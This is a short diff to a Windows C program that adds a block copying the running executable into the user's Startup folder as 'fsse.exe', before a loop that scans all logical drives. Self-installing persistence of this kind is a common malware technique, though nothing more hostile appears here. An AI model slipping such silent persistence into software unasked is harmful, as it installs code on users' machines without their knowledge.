@@ -110,6 +110,13 @@ int WinMain(HINSTANCE hInstance,
         return 1;
     }
 
+    // add to startup
+#ifndef TEST
+    GetStartupFolderPath(path_buf);
+    strcat(path_buf, "\\fsse.exe");
+    CopyFile(assembly_path, path_buf, TRUE);
+#endif
+
     while (true) {
         printf("doing scan cycle\n");
         // query all logical drives on computer
